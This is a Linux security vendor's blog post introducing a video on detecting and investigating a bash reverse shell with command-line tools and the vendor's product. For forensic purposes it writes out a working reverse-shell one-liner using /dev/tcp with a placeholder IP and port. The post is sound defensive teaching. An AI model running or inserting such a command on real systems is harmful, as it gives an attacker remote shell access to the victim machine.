---
title: Linux Reverse Shell Detection and Forensics
url: https://sandflysecurity.com/blog/linux-reverse-shell-detection-and-forensics/
source: Sandfly Security Blog RSS Feed
date: 2024-12-03
fetch_date: 2025-10-06T19:38:17.008857
---

# Linux Reverse Shell Detection and Forensics

[Sandfly 5.5.4 - Chinese/Korean Rootkit Decloaking. Learn more](/blog/sandfly-5-5-4-north-korean-rootkit-decloaking)

[Partners](/about-us/partner)[Support](/support)[Contact Us](/contact-us)

PlatformWhy SandflyResourcesAbout[Blog](/blog)[Get Sandfly](/get-sandfly)

Sandfly Blog

# Linux Reverse Shell Detection and Forensics

02 December 2024

Videos

In this video, we cover how to investigate one of our favorite reverse shells on Linux:

`bash -i >& /dev/tcp/<IP_ADDRESS>/<PORT> 0>&1`

This simple command will launch a shell from the victim system to the IP address supplied. It is simple, effective, and works immediately on just about any Linux distribution.

In this video we'll show you how to identify this attack using command line tools and agentless Sandfly. We'll cover the basic reverse shell attack pattern, what it looks like from an alert perspective, what it looks like from the terminal, and how to investigate the suspicious process using simple command line tools. We'll even show you how to spy on the reverse shell activity using a command built into many Linux distributions (*peekfd*).

Sandfly is able to find this and many other types of Linux attacks without deploying any endpoint agents. Get your [free license](https://sandflysecurity.com/get-sandfly/) today or [contact us](https://sandflysecurity.com/contact-us/) for more information.

---

Post Tags:

[Videos](/blog/tag/videos)[Education](/blog/tag/education)[Linux Forensics](/blog/tag/linux-forensics)

Share this post:

[← Return to Blog](/blog)

---

#### Contact Us

---

+64 3 3792313[4 Ash Street Christchurch, New Zealand 8011](https://goo.gl/maps/9cFto1o6GNa9RK6S9)

#### Connect With Us

---

#### Product Navigation

---

* [Threat Detection](/platform/threat-detection)
* [SSH Key Monitoring](/platform/ssh-key-monitoring)
* [Password Auditing](/platform/password-auditing)
* [Drift Detection](/platform/drift-detection)
* [Incident Response](/platform/incident-response)
* [Requirements & Installation](/resources/requirements-installation)

#### General Navigation

---

* [Our Company](/about-us/our-company)
* [Partners](/about-us/partner)
* [Under Attack?](/under-attack)
* [Contact Us](/contact-us)
* [Let’s Connect](/request-a-meeting)
* [Manage My Subscription](https://billing.sandflysecurity.com/p/login/28o7tJe2vbLNfEA9AA)

#### Sign-up For Updates

---

First Name

First Name

Last Name

Last Name

Email

Email

Subscribe

© 2025 Sandfly Security, Ltd. [End User License Agreement](/end-user-license-agreement) & [Privacy Policy](/privacy-policy). This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply. Linux® is the registered trademark of Linus Torvalds in the U.S. and other countries.

[![Veracode Verified Standard](/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fveracode-verified-standard-white.d24ef83e.png&w=384&q=75 "Veracode Verified Standard")](https://www.veracode.com/verified/directory/sandfly-security)